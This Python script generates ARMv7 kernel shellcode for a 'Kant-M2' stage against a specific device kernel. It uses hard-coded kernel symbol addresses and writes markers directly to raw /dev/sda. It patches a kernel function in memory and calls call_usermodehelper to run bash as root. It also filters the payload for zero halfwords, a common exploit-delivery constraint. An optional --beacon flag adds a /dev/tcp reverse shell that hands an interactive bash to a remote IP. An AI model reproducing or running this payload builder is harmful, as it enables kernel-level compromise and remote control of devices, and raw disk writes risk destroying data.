#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-only
# Kant-M2 adaptation; see docs/PROVENANCE.md.
"""Diagnostic Kant-M2 kernel stage: raw-device markers on /dev/sda.

Markers (all in the unused gap between the MBR and partition 1):
  offset 1024  "KANT-A01"          written by the stage before the UEP patch
  offset 1536  "KANT" + umh_r0     written after call_usermodehelper returns
  offset 2048  "KANT-BASH-OK"      written by bash via /usr/bin/dd

The point is to separate three facts without network, mounts, or bash:
  A present  -> the stage really executes in a context where /dev/sda and
                kernel file I/O work;
  B present  -> the UEP patch and the call_usermodehelper call did not fault,
                and B's second word is the UMH return value (0 = queued,
                negative = errno);
  C present  -> /bin/bash actually ran and could execute a signed binary.

Absolute addresses resolved from __ksymtab in inputs/kernel.bin
(validated against known call_usermodehelper=0xc0039a78 and memcpy=0xc01fa720).
"""
import argparse
import os
import shutil
import struct
import subprocess
import tempfile

from build_kernel_stage_kant import PROFILES, asm_string, extract_text, disasm

FILP_OPEN = 0xC00F2D58
KERNEL_WRITE = 0xC011E1A0
VFS_FSYNC = 0xC0120798
FILP_CLOSE = 0xC00F1C68

BASH_MARKER = (
    "printf KANT-BASH-OK|/usr/bin/dd of=/dev/sda bs=1 seek=2048 "
    "conv=notrunc,fsync 2>/dev/null;"
)

HELPER = """
@ write_at(offset=r0, buf=r1, len=r2) -- best effort, never faults on error
write_at:
    push    {r4, r5, r6, r7, r8, lr}
    sub     sp, sp, #8
    mov     r4, r0
    mov     r5, r1
    mov     r6, r2
    movw    r12, #:lower16:(dev_path - _start + 0xc0008470)
    movt    r12, #:upper16:(dev_path - _start + 0xc0008470)
    mov     r0, r12
    mov     r1, #1
    mov     r2, #1
    sub     r2, r2, #1
    ldr     r7, filp_open_addr
    blx     r7
    movw    r3, #0xF000
    movt    r3, #0xFFFF
    cmp     r0, r3
    bhs     9f
    mov     r7, r0
    str     r4, [sp]
    mov     r4, #1
    sub     r4, r4, #1
    str     r4, [sp, #4]
    mov     r0, r7
    mov     r1, r5
    mov     r2, r6
    mov     r3, sp
    ldr     r4, kernel_write_addr
    blx     r4
    mov     r0, r7
    mov     r1, #1
    sub     r1, r1, #1
    ldr     r4, vfs_fsync_addr
    blx     r4
    mov     r0, r7
    mov     r1, #1
    sub     r1, r1, #1
    ldr     r4, filp_close_addr
    blx     r4
9:
    add     sp, sp, #8
    pop     {r4, r5, r6, r7, r8, pc}
"""


def emit(profile, beacon=None):
    p = dict(PROFILES[profile])
    command = BASH_MARKER + p["command"]
    if beacon:
        host, port = beacon.rsplit(":", 1)
        if not port.isdigit() or any(c not in "0123456789abcdefABCDEF:." for c in host):
            raise SystemExit("--beacon must be a numeric IP address and port")
        command = (
            f"if exec 9<>/dev/tcp/{host}/{port} 2>/dev/null;then "
            "echo KERNEL-STAGE-OK >&9;"
            "/bin/bash -i <&9 >&9 2>&9 & exec 9>&-;"
            "fi;" + command
        )
    patch = ""
    if p["uep"] is not None:
        patch = f"""    ldr     r0, uep_addr
    ldr     r1, uep_word0
    str     r1, [r0]
    ldr     r1, uep_word1
    str     r1, [r0, #4]
    add     r1, r0, #8
    ldr     r3, coherent_addr
    blx     r3
"""
    def addr(reg, label):
        return (
            f"    movw    {reg}, #:lower16:({label} - _start + 0xc0008470)\n"
            f"    movt    {reg}, #:upper16:({label} - _start + 0xc0008470)\n"
        )

    def call(label):
        return (
            f"    movw    r12, #:lower16:({label} - _start + 0xc0008470)\n"
            f"    movt    r12, #:upper16:({label} - _start + 0xc0008470)\n"
            "    blx     r12\n"
        )

    return f""".syntax unified
.arm
.global _start
.section .text
_start:
    ldr     r4, saved_ip_addr
    ldr     sp, [r4]
    sub     sp, sp, #256
    bic     sp, sp, #7
    sub     sp, sp, #64
    movw    r0, #0x400
{addr('r1', 'mark_a')}    mov     r2, #8
{call('write_at')}{patch}{addr('r12', 'path')}    mov     r0, r12
    str     r0, [sp, #16]
{addr('r4', 'arg_c')}    str     r4, [sp, #20]
{addr('r4', 'command')}    str     r4, [sp, #24]
    mov     r4, #1
    sub     r4, r4, #1
    str     r4, [sp, #28]
    add     r1, sp, #16
    mov     r2, #1
    sub     r2, r2, #1
    mov     r3, #1
    sub     r3, r3, #1
    ldr     r4, umh_addr
    blx     r4
    mov     r8, r0
    movw    r5, #0x414B
    movt    r5, #0x544E
    str     r5, [sp, #40]
    str     r8, [sp, #44]
    movw    r0, #0x600
    add     r1, sp, #40
    mov     r2, #8
{call('write_at')}1:  movw    r0, #0xffff
    movt    r0, #0x7fff
    ldr     r4, park_addr
    blx     r4
    b       1b

path:       .asciz "{asm_string(p['path'])}"
arg_c:      .asciz "-c"
command:    .asciz "{asm_string(command)}"
    .balign 4, 0x41

{HELPER}
dev_path:   .asciz "/dev/sda"
mark_a:     .ascii "KANT-A01"
    .balign 4, 0x41
coherent_addr:    .word 0x{p['coherent']:08x}
umh_addr:         .word 0x{p['umh']:08x}
park_addr:        .word 0x{p['park']:08x}
saved_ip_addr:    .word 0xc0008d00
filp_open_addr:   .word 0x{FILP_OPEN:08x}
kernel_write_addr: .word 0x{KERNEL_WRITE:08x}
vfs_fsync_addr:   .word 0x{VFS_FSYNC:08x}
filp_close_addr:  .word 0x{FILP_CLOSE:08x}
""" + (f"""uep_addr:         .word 0x{p['uep']:08x}
uep_word0:        .word 0xe3a00002
uep_word1:        .word 0xe12fff1e
""" if p["uep"] is not None else "")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--profile", choices=PROFILES, default="kant-uep")
    ap.add_argument("--out", required=True)
    ap.add_argument("--beacon")
    ap.add_argument("--keep-asm")
    ap.add_argument("--disasm", action="store_true")
    a = ap.parse_args()

    clang = shutil.which("clang")
    if not clang:
        raise SystemExit("clang not found")
    src_text = emit(a.profile, a.beacon)
    if a.keep_asm:
        open(a.keep_asm, "w").write(src_text)
        print(f"wrote {a.keep_asm}")
    with tempfile.TemporaryDirectory(prefix="kant-marker-") as td:
        src = os.path.join(td, "stage.S")
        obj = os.path.join(td, "stage.o")
        open(src, "w").write(src_text)
        subprocess.run(
            [clang, "-target", "armv7-none-eabi", "-march=armv7-a",
             "-c", src, "-o", obj],
            check=True)
        blob = extract_text(obj)
    if len(blob) % 4:
        raise SystemExit(f".text length {len(blob)} is not 4-byte aligned")
    zeros = [i for i in range(0, len(blob), 2)
             if struct.unpack_from("<H", blob, i)[0] == 0]
    if zeros:
        raise SystemExit(
            f"generated payload contains zero halfwords at "
            f"{[hex(x) for x in zeros]}")
    open(a.out, "wb").write(blob)
    print(f"wrote {a.out}: {len(blob)} bytes, zero_halfwords=[]")
    if a.disasm:
        disasm(blob)


if __name__ == "__main__":
    main()
